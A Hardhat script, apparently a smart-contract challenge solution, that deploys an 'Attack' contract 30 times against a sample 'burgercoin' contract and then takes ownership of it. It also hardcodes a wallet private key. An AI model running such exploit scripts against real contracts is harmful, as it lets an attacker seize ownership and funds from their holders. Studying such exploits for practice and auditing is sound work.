import { ethers } from "hardhat";

async function main() {
  const [deployer] = await ethers.getSigners();
  const l2Signer = new ethers.Wallet('0xc9e9e748dd5797c69b9066bb5f563e1de3e675104a9033b5b9c49506e2957c8a') //wallet
  l2Signer.connect(ethers.provider)


  const burgerFactory = await ethers.getContractFactory("burgercoin");
  const attackFactory = await ethers.getContractFactory("Attack");

  const burger = await burgerFactory.attach(
    '0x7C1a67dAC2a54282973095d7c7D2eA19C6361030' //sample contract address
  )
  console.log("BurgerCoin deployed to:", await burger.getAddress());

  for (let i = 0; i < 30; i++) {
    const attack = await attackFactory.deploy(
        '0x7C1a67dAC2a54282973095d7c7D2eA19C6361030' //sample contract address
    )
    await attack.attack('0xF8de1BA5dDf6C63959cCd207Eb4Bc8F9a073b7DB'); //my address
  }
  await burger.transferBurgerjointOwnership('0x7C1a67dAC2a54282973095d7c7D2eA19C6361030'); //contract with balance of zero
  console.log(await burger.owner());
}
// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
